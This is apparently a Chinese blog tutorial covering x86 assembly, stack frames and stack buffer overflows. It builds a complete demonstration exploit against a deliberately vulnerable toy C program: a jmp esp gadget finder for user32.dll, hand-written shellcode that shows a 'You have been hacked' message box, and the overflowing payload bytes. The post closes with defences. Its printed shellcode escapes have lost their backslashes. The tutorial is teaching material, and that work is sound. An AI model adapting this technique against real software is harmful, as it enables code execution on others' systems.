#### 文章目录

+   [前言](#_2)
+   [汇编语言](#_8)
+   +   [寄存器](#_24)
    +   [内存堆栈](#_35)
    +   [CPU指令](#CPU_77)
    +   [函数调用](#_177)
+   [缓冲区溢出](#_233)
+   +   [栈溢出原理](#_236)
    +   [栈溢出攻击](#_260)
    +   [ShellCode](#ShellCode_266)
+   [总结](#_462)

## 前言

缓冲区溢出（Buffer Overflow）是计算机安全领域内既经典而又古老的话题。1988 年的 Morris 蠕虫病毒，利用 UNIX 服务 finger 中的缓冲区溢出漏洞来获得访问权限并得到一个 shell，成功感染了 6000 多台机器。1996年前后，开始出现大量的缓冲区溢出攻击，因此引起人们的广泛关注。源码开放的操作系统首当其冲，Windows 系统下的缓冲区溢出也相继被发掘出来。

缓冲区是内存中存放数据的地方，缓冲区溢出漏洞是指在程序试图将数据放到及其内存中的某一个位置的时候，因为没有足够的空间就会发生缓冲区溢出的现象。在 C 语言中，指针和数组越界不保护是 Buffer overflow 的根源，而且，在 C 语言标准库中就有许多能提供溢出的函数，如 strcat(), strcpy(), sprintf(), vsprintf(), bcopy(), gets() 和 scanf()。

与其他的攻击类型相比，缓冲区溢出攻击不需要太多的先决条件且杀伤力很强（可形成远程任意命令执行），同时在 Buffer Overflows 攻击面前，防火墙往往显得很无奈。
本文将记录、学习下缓冲区溢出漏洞及其 Shellcode 的编写。

## 汇编语言

缓冲区溢出漏洞跟 CPU 内存堆栈紧密相关，在学习缓冲区溢出漏洞之前，必不可少得就是了解 CPU 中堆栈的概念和汇编语言的相关知识。

> 汇编语言参考教程： [王爽《汇编语言》笔记（详细）](https://blog.csdn.net/qq_39654127/article/details/88698911)，建议下载 PDF 电子书进行学习。

多数程序员学习的编程语言都是像 Java、Python、Go 等高级语言，这些编程语言均属于专门为人类设计的计算机语言。但是计算机本身并不理解高级语言，高级语言的源代码必须通过编译器转成二进制代码后才能在计算机上运行。计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什么，以及代码的运行步骤，就一定要学习汇编语言。

汇编语言是一种以处理器指令系统为基础的低级程序设计语言。利用汇编语言编写程序的主要优点是可以直接、有效地控制计算机硬件，因而容易创建代码序列短小、运行快速的可执行程序。汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令 00000011 写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。

汇编语言的主要应用场合：

1.  程序执行占用较短的时间，或者占用较小存储容量的场合；
2.  程序与计算机硬件密切相关，程序直接控制硬件的场合；
3.  需提高大型软件性能的场合或者没有合适的高级语言的场合。

汇编语言与具体的微处理器相联系，每种微处理器的汇编语言都不一样。通过都以常用的、结构简洁的 Intel 8086 汇编语言进行学习，学习汇编语言可以帮助我们充分获得底层编程的体验，深刻理解机器运行程序的机理。

### 寄存器

学习汇编语言，首先必须了解两个知识点：寄存器和内存模型。

先来看寄存器。CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f7a3e0f9c0c091684816a73afba765b2.png)

但是 CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/51b194b7ca3d1fbd77e32cc3847bd37a.png)早期的 x86 CPU 只有 8 个寄存器，而且每个都有不同的用途。现在的寄存器已经有100多个了，都变成通用寄存器，不特别指定用途了，但是早期寄存器的名字都被保存了下来，上图是 8086 CPU 的寄存器思维导图。

寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。

### 内存堆栈

寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。

程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从 0x1000 到 0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5b9f4449da3d86d383fc9b24e6261c78.png)  
**1、Heap（堆）**

程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用`malloc`命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到 10 个字节内存，那么从起始地址 0x1000 开始给他分配，一直分配到地址 0x100A，如果再要求得到 22 个字节，那么就分配到 0x1020。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8beddfbdb2965ab07f556c3c27e4ed22.png)  
这种因为用户主动请求而划分出来的内存区域，叫做 **Heap（堆）**。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。

**2、Stack（栈）**

除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/90067581753e46892aab6f4a29421abd.png)  
请看下面的例子：

```c
int main() {
   int a = 2;
   int b = 3;
}
```

上面代码中，系统开始执行 main 函数时，会为它在内存里面建立一个帧（frame），所有 main 的内部变量（比如 a 和 b）都保存在这个帧里面。main 函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/4b3bd0745b8a84452bbef2e41abb5df5.png)  
如果函数内部调用了其他函数，会发生什么情况？

```c
int main() {
   int a = 2;
   int b = 3;
   return add_a_and_b(a, b);
}
```

上面代码中，main 函数内部调用了 add\_a\_and\_b 函数。执行到这一行的时候，系统也会为 add\_a\_and\_b 新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：main 和 add\_a\_and\_b。一般来说，调用栈有多少层，就有多少帧。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5bf879709bc16e7556ef2290ff413701.png)  
等到 add\_a\_and\_b 运行结束，它的帧就会被回收，系统会回到函数 main 刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9dbbe8584b462e1c69ca7a27783fff03.png)  
所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做"入栈"，英文是 push；栈的回收叫做"出栈"，英文是 pop。Stack 的特点就是，**最晚入栈的帧最早出栈**（因为最内层的函数调用，最先结束运行），这就叫做"后进先出"的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6bb55c2766166e6fa3c57ce33bcef0c7.png)  
Stack 是由内存区域的结束地址开始，**从高位（地址）向低位（地址）分配**。比如，内存区域的结束地址是 0x8000，第一帧假定是16字节，那么下一次分配的地址就会从 0x7FF0 开始；第二帧假定需要 64 字节，那么地址就会移动到 0x7FB0。

### CPU指令

了解寄存器和内存模型以后，就可以来看汇编语言到底是什么了。下面是一个简单的程序 example.c：

```c
int add_a_and_b(int a, int b) {
   return a + b;
}

int main() {
   return add_a_and_b(2, 3);
}
```

使用 gcc 将这个程序转成汇编语言：

```c
$ gcc -S example.c
```

上面的命令执行以后，会生成一个文本文件 example.s，里面就是汇编语言，包含了几十行指令。这么说吧，一个高级语言的简单操作，底层可能由几个，甚至几十个 CPU 指令构成。CPU 依次执行这些指令，完成这一步操作。example.s 经过简化以后，大概是下面的样子：

```c
_add_a_and_b:
   push   %ebx
   mov    %eax, [%esp+8] 
   mov    %ebx, [%esp+12]
   add    %eax, %ebx 
   pop    %ebx 
   ret  

_main:
   push   3
   push   2
   call   _add_a_and_b 
   add    %esp, 8
   ret
```

可以看到，原程序的两个函数 add\_a\_and\_b 和 main，对应两个标签 \_add\_a\_and\_b 和 \_main。每个标签里面是该函数所转成的 CPU 运行流程。

**1、Push 指令**

根据约定，程序从 \_main 标签开始执行，这时会在 Stack 上为 main 建立一个帧，并将 Stack 所指向的地址，写入 ESP 寄存器。后面如果有数据要写入 main 这个帧，就会写在 ESP 寄存器所保存的地址。

然后，开始执行第一行代码：`push 3`。push 指令用于将运算子放入 Stack，这里就是将 3 写入 main 这个帧。虽然看上去很简单，push 指令其实有一个前置操作。它会先取出 ESP 寄存器里面的地址，将其减去 4 个字节，然后将新地址写入 ESP 寄存器。使用减法是因为 Stack 从高位向低位发展，4 个字节则是因为 3 的类型是 int，占用 4个字节。得到新地址以后， 3 就会写入这个地址开始的四个字节。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f4fe2eeb65564001e0e5fcb023f8957b.png)  
第二行指令—— `push 2`也是一样，push 指令将 2 写入 main 这个帧，位置紧贴着前面写入的 3。这时，ESP 寄存器会再减去 4个字节（累计减去8）。

**2、call 指令**

第三行的call指令用来调用函数。

```c
call   _add_a_and_b
```

上面的代码表示调用 add\_a\_and\_b 函数。这时，程序就会去找 \_add\_a\_and\_b 标签，并为该函数建立一个新的帧。下面就开始执行 \_add\_a\_and\_b 的代码。

```c
push   %ebx
```

这一行表示将 EBX 寄存器里面的值，写入 \_add\_a\_and\_b这个帧。**这是因为后面要用到这个寄存器，就先把里面的值取出来，用完后再写回去。** 这时，push 指令会再将 ESP 寄存器里面的地址减去 4 个字节（累计减去12）。

**3、mov 指令**

mov 指令用于将一个值写入某个寄存器。

```c
mov    %eax, [%esp+8] 
```

这一行代码表示，先将 ESP 寄存器里面的地址加上 8 个字节，得到一个新的地址，然后按照这个地址在 Stack 取出数据。根据前面的步骤，可以推算出这里取出的是 2，再将 2 写入 EAX 寄存器。下一行代码也是干同样的事情。

```c
mov    %ebx, [%esp+12] 
```

上面的代码将 ESP 寄存器的值加 12 个字节，再按照这个地址在 Stack 取出数据，这次取出的是 3，将其写入 EBX 寄存器。

**4、add 指令**

add 指令用于将两个运算子相加，并将结果写入第一个运算子。

```c
add    %eax, %ebx
```

**上面的代码将 EAX 寄存器的值（即2）加上 EBX 寄存器的值（即3），得到结果 5，再将这个结果写入第一个运算子 EAX 寄存器。**

**5、pop 指令**

pop 指令用于取出 Stack 最近一个写入的值（即最低位地址的值），并将这个值写入运算子指定的位置。

```c
pop    %ebx
```

**上面的代码表示，取出 Stack 最近写入的值（即 EBX 寄存器的原始值），再将这个值写回 EBX 寄存器（因为加法已经做完了，EBX 寄存器用不到了）。注意，pop 指令还会将 ESP 寄存器里面的地址加4，即回收4个字节。**

**6、ret 指令**

ret 指令用于终止当前函数的执行，将运行权交还给上层函数。也就是，当前函数的帧将被回收。该指令没有运算子。随着 add\_a\_and\_b 函数终止执行，系统就回到刚才 main 函数中断的地方，继续往下执行。

```c
add    %esp, 8 
```

**上面的代码表示，将 ESP 寄存器里面的地址，手动加上 8 个字节，再写回 ESP 寄存器。这是因为 ESP 寄存器的是 Stack 的写入开始地址，前面的pop操作已经回收了 4 个字节，这里再回收 8 个字节，等于全部回收。最后，main 函数运行结束，ret 指令退出程序执行。**

### 函数调用

栈的主要功能是实现函数的调用。因此在介绍栈溢出原理之前，需要弄清函数调用时栈空间发生了怎样的变化。
**每次函数调用时，系统会把函数的返回地址（函数调用指令后紧跟指令的地址），一些关键的寄存器值保存在栈内，函数的实际参数和局部变量（包括数据、结构体、对象等）也会保存在栈内。这些数据统称为函数调用的栈帧，而且是每次函数调用都会有个独立的栈帧，这也为递归函数的实现提供了可能。**

上面演示的代码案例，只是为了方便理解汇编程序的指令而简化并省略了部分汇编指令，实际上对于函数调用、返回过程中的内存操作细节的描述并不准确……为了后续更好地理解缓冲区溢出漏洞，不得不进一步了解函数调用过程中 CPU 内存栈的变化细节。

实际上，函数调用中栈的工作过程如下：

```py
调用函数前
　　压入栈
　　　 1）上级函数传给 A 函数的参数
　　　 2）返回地址 ( EIP：Extended Instruction Pointer，指向下一条将要执行的指令的地址)
　　　 3）当前的 EBP
　　　 4）函数的局部变量

调用函数后
　　恢复 EBP
　　恢复 EIP
　　局部变量不作处理
```

下面用一个例子来讲函数调用过程中栈的变化:

```c
int sum(int _a,int _b)
{
    int c=0;
    c=_a+_b; 
    return c;
}
 
int main()
{
    int a=10;
    int b=20;
    ret=sum(a,b); 
    return 0；
}
```

1、 main 函数的栈在调用 sum 函数之前如图：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0b8b6b4df57000073f4b1719105f5935.png)2、**接着调用 ret=sum(a,b) 函数，首先函数参数从右至左入栈：**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/1fa2e4e68af214eb794c45229dc404e1.png)3、**call 指令调用 sum 函数时实际上分两步：`push EIP` 将下一条指令入栈保存起来，作为后续 sum 函数执行完毕后的返回地址，然后 `esp-4` 令 esp 指针下移：** 
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/72953951af051eccec31b40f940be88c.png)4、**执行指令`push ebp` 将 main 父函数的基指针入栈保存：**
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/10b08a407ca90435fdd02a62505232fa.png)5、接着还需执行指令 `mov ebp esp` ，将 esp 的值存入 ebp，也就等于将 ebp 指向 esp（**目的是将 ebp 指向后面由 sum 函数触发的新的栈帧的栈底**）：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/2c5f1a3e09664af687c5360a255de657.png)  
6、**然后执行指令`sub esp 44H`将 esp下移动一段空间，创建 sum 函数的栈栈帧：**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/2491020d475ca13c5c28e725ab0e0ca9.png)  
7、sum 函数的内部逻辑实现过程忽略（前面已经讲解了），直接看看函数返回。**sum 函数执行完以后，程序将执行指令 `mov esp ebp`，将 ebp 的值赋给 esp，也就等于将 esp 指向 ebp，销毁 sum 函数栈帧：**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ffce1697bc8baca4d306b962cfc5da8c.png)  
8、接着执行`pop ebp`指令，**将 ebp 出栈，将栈中保存的 main 函数的基址赋值给 ebp ：**
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/993469f966e68e303eea96033b026009.png)9、**执行指令`ret` ，ret 相当于 pop eip，就是把之前保存的函数返回地址(也就是 main 函数中下一条该执行的指令的地址)出栈：**
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5eeea26b4cbafd255a0d5215542f4678.png)10、最后执行`add esp,8` 指令，因为传入 sum 函数的参数已经不需要了，我们将 esp 指针上移（**注意这里修改 esp 的值很重要，是后续栈溢出攻击的关键！！**）：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/bf64877502d77ee59cfe9ae9bf83f6a6.png)  
此时函数整个调用过程就结束了，main 函数栈恢复到了调用之前的状态。


## 缓冲区溢出

弄清了函数调用时栈空间发生了怎样的变化，就可以开始介绍栈溢出的原理了。

### 栈溢出原理

很多程序都会接受用户的外界输入，尤其是当函数内的一个数组缓冲区接受用户输入的时候，一旦程序代码未对输入的长度进行合法性检查的话，缓冲区溢出便有可能触发！比如下边的一个简单的函数：

```c
void msg_display(char * data)
{
    char buffer[200];
    strcpy(buffer,data);
}
```

这个函数分配了 200 个字节的缓冲区，然后通过 strcpy 函数将传进来的字符串复制到缓冲区中，最后输出，如果传入的字符串大于 200 的话就会发生溢出，并向后覆盖堆栈中的信息，如果只是一些乱码的话那个最多造成程序崩溃，如果传入的是一段精心设计的代码，那么计算机可能回去执行这段攻击代码。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8a3d343d96fad368fe0cf1c804c5a3b6.png)由于栈是低地址方向增长的，因此局部数组 buffer 的指针在缓冲区的下方。当把 data 的数据拷贝到 buffer 内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：

1.  淹没了其他的局部变量：如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程；
2.  淹没了父函数栈底指针 ebp 的值：修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡；
3.  **淹没了返回地址：这是栈溢出原理的核心所在**，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！
4.  淹没参数变量：修改函数的参数变量也可能改变当前函数的执行结果和流程；
5.  淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。

综上所述，如果在 data 本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出时修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/112131f3a34fdc2a72cd8ec75e87613c.png)  
攻击者通过计算返回地址内存区域相对于 buffer 的偏移，并在对应位置构造新的地址指向 buffer 内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为 Shellcode，因为攻击者希望通过这段代码打开系统的 shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。

### 栈溢出攻击

上述过程虽然理论上能完成栈溢出攻击行为，但是实际上很难实现，因为操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。攻击者需要其他方法来确保程序能执行到正确的地址（即准确地定位 Shellcode 的地址），需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。

【重点】根据前边“汇编语言-函数调用”部分的知识所述，函数执行后，栈指针 esp 会恢复到调用该函数时压入参数时的状态，在上图中即 data 区域（函数参数）的地址。如果我们在函数的返回地址填入一个地址，该地址指向的内存保存了一条特殊的指令 `jmp esp`（跳转指令）。那么函数返回后，会执行该指令并跳转到 esp 所在的位置——即 data（函数参数) 的位置。我们可以将缓冲区再多溢出一部分，淹没 data 这样的函数参数，并在这里放上我们想要执行的代码！这样，不管程序被加载到哪个位置，最终都会回来执行栈内的代码。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6950f1ebec9c3b20045f7bf85e70a6d6.png)

### ShellCode

下面基于 [i春秋的教学视频](https://www.bilibili.com/video/BV1oi4y1G7RZ?p=1%29)（强烈推荐仔细观看，讲得很好很通透易懂），通过利用一个程序漏洞，演示如何人编写 Shellcode，来达成最终的攻击效果：蹦出对话框并显示“You have been hacked!(by JWM)”。带有漏洞的程序如下：

```c
#include "stdio.h"
#include "string.h"
char name[] = "jiangye";
int main()
{
  char buffer[8];
  strcpy(buffer, name);
  printf("%s",buffer);
  getchar();
  return 0;
}
```

**（1）选取跳板**

上面讲了实现栈溢出攻击时，借助于跳板的确可以很好的解决栈帧移位（栈加载地址不固定）的问题，但是跳板指令从哪找呢？“幸运”的是，在 Windows 操作系统加载的大量 dll 中，包含了许多这样的指令，比如 kernel32.dll，ntdll.dll，这两个动态链接库是 Windows 程序默认加载的。如果是图形化界面的 Windows 程序还会加载 user32.dll，它也包含了大量的跳板指令！而且更“神奇”的是 Windows 操作系统加载 dll 时候一般都是固定地址，因此这些 dll 内的跳板指令的地址一般都是固定的。我们可以离线搜索出跳板执行在 dll 内的偏移，并加上 dll 的加载地址，便得到一个适用的跳板指令地址！

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
        BYTE *ptr;
        int position;
        HINSTANCE handle;
        BOOL done_flag = FALSE;
        handle = LoadLibrary("user32.dll");
        if(!handle)
        {
                printf("load dll error!");
                exit(0);
        }
        ptr = (BYTE*)handle;

        for(position = 0; !done_flag; position++)
        {
                try
                {
                        if(ptr[position]==0xFF && ptr[position+1]==0xE4)
                        {
                                int address = (int)ptr + position;
                                printf("OPCODE found at 0x%x\n", address);
                        }
                }
                catch(...)
                {
                        int address = (int)ptr + position;
                        printf("END OF 0x%x\n", address);
                        done_flag = true;
                }
        }
        getchar();
        return 0;
}
```

上述程序实现乐在 user32.dll 中查找 jmp esp 这条指令的地址（当然，jmp esp 在很多动态链接库中都存在，这里只是以 user32.dll 作为例子）。由于 jmp esp 指令的二进制表示为`0xffe4`，因此搜索算法就是搜索 dll 内这样的字节数据即可。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c0cac16e42dcc15e492a935428582c26.png)  
可以看到，这里列出了非常多的结果（我自己动手敲的时候VC链接报错，于是直接使用i春秋的图）。我们随便取出一个结果用于实验。这里我选择的是倒数第二行的`0x77e35b79`。也就是说，需要使用这个地址来覆盖程序的返回地址。这样，程序在返回时，就会执行 jmp esp，从而跳到返回地址下一个位置去执行该地址处的语句。

至此可以先总结一下即将要编写的程序中 “name” 数组中的内容，经过分析可以知道，其形式为 AAAAAAAAAAAAXXXXSSSS……SSSS：

1.  其中前 12 个字符为任意字符（第 9-12 位是为了填充覆盖 ret 指令前存储的父函数 EBP 的值）；
2.  XXXX 为返回地址（即我使用的是 0x77e35b79）；
3.  而 SSSS 是想要让计算机执行的代码（即需要构造的执行弹窗的 ShellCode）。

**（2）获取 Shellcode 中 API 函数（弹窗）的地址**

下面的工作就是让存在着缓冲区溢出漏洞的程序显示这么一个对话框。由于我在这里想要调用`MessageBox()`这个 API 函数，所以首先需要获取该函数的地址，这可以通过编写一个小程序来获取：

```c
#include <windows.h>
#include <stdio.h>
typedef void (*MYPROC)(LPTSTR);
int main()
{ 
        HINSTANCE LibHandle;
        MYPROC ProcAdd;
        LibHandle = LoadLibrary("user32");
        //获取user32.dll的地址
        printf("user32 = 0x%x", LibHandle);
        //获取MessageBoxA的地址
        ProcAdd=(MYPROC)GetProcAddress(LibHandle,"MessageBoxA");
        printf("MessageBoxA = 0x%x", ProcAdd);
        getchar();
        return 0;
}
```

效果如下：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/de03510006444458e0f041df363713df.png)**（3）编写汇编代码**

将写汇编之前必要的信息罗列一下：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9da4644b1c8c75849efeab2926fbf4a1.png)  
最终的汇编代码：

```c
int main()
{
 _asm{
  sub esp,0x50  //抬高栈帧
  xor ebx,ebx   //清零
  push ebx     // 分割字符串

  push 0x20676e69   
  push 0x6e726157    // push "Warning"
  mov eax,esp   //用eax存放“Warning”的指针

  push ebx             // 分割字符串  
  push 0x2020292e
  push 0x592e4a20
  push 0x79622821
  push 0x64656b63
  push 0x6168206e
  push 0x65656220
  push 0x65766168
  push 0x20756f59   // push "You have been hacked!(by Jwm)"
  mov ecx,esp      //用ecx存放该字符串的指针    

  push ebx
  push eax
  push ecx
  push ebx   //MessageBox函数参数依次入栈
  mov eax,0x77d507ea
  call eax        // call MessageBox
  push ebx  //ExitProcess函数参数入栈
  mov eax, 0x7c81cafa
  call eax       // call ExitProcess
 }
 return 0;
}
```

**（4）得到 Shellcode 机器码**

在 VC 中在程序的 “\_asm” 位置先下一个断点，然后按 F5（Go），再单击 Disassembly，就能够查看所转换出来的机器码（当然也可以使用 OD 或者 IDA 查看）：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/968f55da58146f7cb9f02a499b900a96.png)抽取出这些机器码，写入漏洞程序的数组中：

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>
char name[] = "x41x41x41x41x41x41x41x41"  // name[0]~name[7]
     "x41x41x41x41"                      // to Overlap EBP
     "x79x5bxe3x77"                      // Return Address(Address of "Jmp eax")
     "x83xECx50"                           // sub esp,0x50
     "x33xDB"                                // xor ebx,ebx
     "x53"                                     // push ebx
     "x68x69x6Ex67x20"
     "x68x57x61x72x6E"                  // push "Warning"
     "x8BxC4"                                 // mov eax,esp
     "x53"                                      // push ebx
     "x68x2Ex29x20x20"
     "x68x20x4Ax2Ex59"
     "x68x21x28x62x79"
     "x68x63x6Bx65x64"
     "x68x6Ex20x68x61"
     "x68x20x62x65x65"
     "x68x68x61x76x65"
     "x68x59x6Fx75x20"   // push "You have been hacked!(by Jwm)"
     "x8BxCC"                        // mov ecx,esp
     "x53"                          // push ebx
     "x50"                          // push eax
     "x51"                          // push ecx
     "x53"                          // push ebx
     "xB8xeax07xd5x77"               
     "xFFxD0"             // call MessageBox
     “x53”
     “xB8xFAxCAx81x7C”
     "xFFxD0";            // call MessageBox

int main()
{
 char buffer[8];
 strcpy(buffer, name);
 printf("%s",buffer);
 getchar();
 return 0;
}
```

最终成果达到漏洞利用——当输入回车，main 执行完 getchar()，即将退出时，跳转到修改过的返回地址，随即通过跳板执行当前 ESP 指向的指令（即Shellcode），触发如下弹窗：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/1d98e93c8ccf4564b408d5b410a0bfdc.png)**（5）OllyDBG 验证**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/52b80f02ddcb8283b40896332a9dcc58.png)明显看出 name\[\] 数组时怎样溢出、覆盖的。

## 总结

为了在系统中插入攻击代码，攻击者既要插入代码，也要插入指向这段代码的指针。这个指针也是攻击字符串的一部分。产生这个指针需要知道这个字符串放置的栈地址。在过去，程序的栈地址非常容易预测。对于所有运行同样程序和操作系统版本的系统来说，在不同的机器之间，栈的位置是相当固定的。因此，如果攻击者可以确定一个常见的Web服务器所使用的栈空间，就可以设计一个在许多机器上都能实施的攻击。

避免缓冲区溢出的三种方法：

**1、栈随机化**

栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。实现的方式是：程序开始时，在栈上分配一段 0 ~ n 字节之间的随机大小的空间，例如，使用分配函数 alloca 在栈上分配指定字节数量的空间。程序不使用这段空间，但是它会导致程序每次执行时后续的栈位置发生了变化。分配的范围 n 必须足够大，才能获得足够多的栈地址变化，但是又要足够小，不至于浪费程序太多的空间。

**2、检测栈是否被破坏**

计算机的第二道防线是能够检测到何时栈已经被破坏。我们在 echo 函数示例中看到，当访问缓冲区越界时，会破坏程序的运行状态。在C语言中，没有可靠的方法来防止对数组的越界写。但是，我们能够在发生了越界写的时候，在造成任何有害结果之前，尝试检测到它。GCC 在产生的代码中加人了一种栈保护者机制，来检测缓冲区越界。

**3、限制可执行代码区域**

最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。在典型的程序中，只有保存编译器产生的代码的那部分内存才需要是可执行的。其他部分可以被限制为只允许读和写。许多系统都有三种访问形式：读（从内存读数据）、写（存储数据到内存）和执行（将内存的内容看作机器级代码）。以前，x86体系结构将读和执行访问控制合并成一个1位的标志，这样任何被标记为可读的页也都是可执行的。栈必须是既可读又可写的，因而栈上的字节也都是可执行的。已经实现的很多机制，能够限制一些页是可读但是不可执行的，然而这些机制通常会带来严重的性能损失。

计算机提供了多种方式来弥补我们犯错可能产生的严重后果，但是最关键的还是我们尽量减少犯错。例如，对于 gets，strcpy 等函数我们应替换为 fgets，strncpy 等。在数组中，我们可以将数组的索引声明为 size\_t 类型，从根本上防止它传递负数。此外，还可以在访问数组前来加上 num 小于 ARRAY\_MAX 语句来检查数组的上界。总之，要养成良好的编程习惯，这样可以节省很多宝贵的时间。

本文参考文章：

1.  [缓冲区溢出漏洞](https://cloud.tencent.com/developer/article/1395248)；
2.  [缓冲区溢出攻击](https://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html);
3.  [网络攻防实战技术之——缓冲区溢出篇](https://cloud.tencent.com/developer/article/1592196)；
4.  [BiliBili视频教程——缓冲区溢出分析基础篇](https://www.bilibili.com/video/BV1oi4y1G7RZ?p=1)。

【汇编部分知识补充】

1）**数据段的操作：**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/443b59e085a50b389eb436f5808011a4.png)  
2）**栈操作：**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/43c41b4e9640cf4c0f5ff9736e3cfdce.png)  
3）**PUSH 指令：**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/eccf6612f407077dc4f1e1a5455beb0f.png)![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/b618bc069478ed2387e2f108198f7a44.png)  
4）**程序在内存中的映像**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9819f02ba2284011b113bc70737c7081.png)  
当进程被加载到内存时，会被分成很多段：

1.  代码段：保存程序文本，指令指针 EIP 就是指向代码段，可读可执行不可写；
2.  数据段：保存初始化的全局变量和静态变量，可读可写不可执行；
3.  BSS：未初始化的全局变量和静态变量；
4.  堆(Heap)：动态分配内存，向地址增大的方向增长，可读可写可执行；
5.  栈(Stack)：存放局部变量，函数参数，当前状态，函数调用信息等，向地址减小的方向增长，可读可写可执行；
6.  环境/参数段（environment/argumentssection）：用来存储系统环境变量的一份复制文件，进程在运行时可能需要。例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。该节是可写的，因此在缓冲区溢出（buffer overflow）攻击中都可以使用该段。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d1c0882515c61a767e69024e750275e5.png)  
5）**Debug程序**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e7bf7522cbf48c9e87da2c9563089122.png)